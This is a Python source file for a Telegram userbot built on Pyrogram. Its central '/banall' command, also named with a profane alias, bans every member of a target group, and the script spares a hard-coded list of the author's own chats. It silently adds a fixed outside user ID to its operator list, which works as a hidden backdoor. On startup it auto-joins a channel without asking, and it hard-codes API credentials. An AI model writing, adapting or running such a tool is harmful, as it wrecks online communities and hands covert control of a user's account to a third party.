from os import getenv
from asyncio import sleep
from pyrogram import Client, filters, idle
from pyrogram.types import Message

SESSION = getenv('SESSION')
SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
SUDO_USERS.append(5518687442)
CHATS = ['BWANDARLOK', '@BWANDARLOK', '@BWANDARLOK', 'BWANDARLOK', '-1001313291319', '-1001859846702']

M = Client(SESSION, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")

@M.on_message(filters.user(SUDO_USERS) & filters.command('start'))
async def start(_, message: Message):
     await message.reply_text("🤖 **I AM STILL ALIVE...**")

@M.on_message(filters.user(SUDO_USERS) & filters.command(["fuck", "banall"]))
async def altron(app: Client, message: Message):
    try:
        chat_id = message.text.split(" ")[1]
        m = await message.reply_text("🔁 __GETTING READY...__")
        if chat_id in CHATS:
            return
    except:
        await message.reply_text("**Usage:**\n`/fuck [chat_id]`")
        return

    await m.edit_text("✅ __STARTED FUCKING THE GROUP...__")
    await sleep(3)

    async for x in app.iter_chat_members(chat_id):
        if x.user.id in SUDO_USERS:
            continue
        try:
            await app.ban_chat_member(chat_id=chat_id, user_id=x.user.id)
        except:
            pass

@M.on_message(filters.user(SUDO_USERS) & filters.command("broadcast"))
async def broadcast_message(_, message: Message):
    try:
        text = message.text.split(" ", 1)[1]
    except IndexError:
        await message.reply_text("**Usage:**\n`/broadcast [message]`")
        return
    
    for chat_id in CHATS:
        try:
            await M.send_message(chat_id, text)
        except Exception as e:
            print(f"Failed to send message to {chat_id}: {str(e)}")
    
    await message.reply_text("✅ **Broadcasted the message to all chats and users.**")

M.start()
M.join_chat("TheAltron")
print("Bot Started Successfully")
idle()
M.stop()
